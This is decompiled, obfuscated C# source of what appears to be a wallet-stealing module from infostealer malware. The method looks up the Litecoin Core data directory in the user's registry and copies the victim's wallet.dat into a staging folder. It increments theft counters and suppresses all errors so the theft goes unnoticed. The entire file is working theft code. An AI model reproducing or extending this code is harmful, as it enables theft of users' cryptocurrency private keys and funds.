using System;
using System.IO;
using Microsoft.Win32;

// Token: 0x02000062 RID: 98
internal class Class35
{
	// Token: 0x0600025B RID: 603 RVA: 0x00012EF4 File Offset: 0x000110F4
	public static void smethod_0(string string_0)
	{
		try
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt"))
			{
				try
				{
					Directory.CreateDirectory(string_0 + "\\Wallets\\LitecoinCore\\");
					File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", string_0 + "\\LitecoinCore\\wallet.dat");
					Class35.int_0++;
					Class37.int_0++;
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x0600025C RID: 604 RVA: 0x0000446C File Offset: 0x0000266C
	public Class35()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x04000114 RID: 276
	public static int int_0;
}
